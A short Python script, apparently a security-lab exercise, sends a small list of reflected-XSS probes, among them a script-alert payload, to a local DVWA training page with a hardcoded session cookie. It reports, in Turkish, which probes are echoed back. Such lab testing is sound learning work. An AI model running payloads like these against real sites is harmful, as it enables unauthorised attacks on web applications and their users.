import requests

header = {"Cookie": "security=medium; PHPSESSID=t6fsab21kllkntcbtjf4mvhohp"}

xss_list = ["siber", "<h1>siber", "<script>alert('siber')</script>"]

for payload in xss_list:
    print(payload)
    url = "http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=" + str(payload)
    sonuc = requests.get(url=url, headers=header)
    if str(payload) in str(sonuc.content):
        print("Muhtemelen XSS var: ", str(payload))
